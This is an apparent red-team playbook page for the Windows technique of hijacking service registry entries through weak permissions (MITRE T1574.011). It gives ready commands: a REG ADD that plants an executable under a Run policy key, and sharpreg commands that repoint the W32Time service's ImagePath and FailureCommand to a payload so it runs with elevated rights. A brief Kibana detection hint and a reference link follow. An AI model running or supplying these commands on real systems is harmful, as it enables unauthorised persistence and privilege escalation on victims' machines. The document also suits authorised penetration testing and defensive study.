# [Services Registry Permissions Weakness](https://attack.mitre.org/techniques/T1574/011/)

## Exploit Description:
Hijack registry entries used by services by using flaws in permissions.  
HKLM\SYSTEM\CurrentControlSet\Services
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v “Canon Gear” /t REG_SZ /d C:\Users\Administrator.vcch\Appdata\Local\.exe
(Substitute registry path locations with what is needed) 


## Exploit syntax:
* Reference [Modify registry](/Poshc2/instructions/Modify_registry.md) for syntax. 

* Example of altering the "FailureCommand" key so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted:

    ```powershell
    # First run this command to stage the service
    sharpreg create     "HKLM\SYSTEM\CurrentControlSet\Services\W32Time" "ImagePath"    "C:\tmp\RUNDLL.exe" REG_SZ

    sharpreg create     "HKLM\SYSTEM\CurrentControlSet\Services\W32Time"    "FailureCommand" "C:\tmp\RUNDLL.exe"  REG_SZ

    ```
    >**Note**: The original image path is " ImagePath	(ExpandString) -> 	C:\windows\system32\svchost.exe -k LocalService"
## Detection Technique:
* Investigating Run and Startup registry keys.

* Kibana:
    * event.code: 13
    * registry.key: *


## Resources
* https://pentestlab.blog/tag/failurecommand/